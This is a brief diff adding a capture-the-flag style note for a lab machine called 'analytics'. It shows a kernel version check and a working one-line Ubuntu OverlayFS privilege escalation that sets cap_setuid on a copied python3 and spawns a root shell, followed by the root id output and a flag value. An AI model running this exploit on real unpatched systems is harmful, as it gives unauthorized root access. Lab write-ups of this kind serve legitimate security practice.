@@ -1,0 +1,13 @@
+after checking the version 
+root@analytics:/root# uname -a
+Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
+
+Exploit : https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/
+
+metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
+
+root@analytics:~# id
+uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
+
+root@analytics:/root# cat root.txt
+N1NJ10N1NJ10N1NJ10N1NJ10N1NJ10N1NJ10
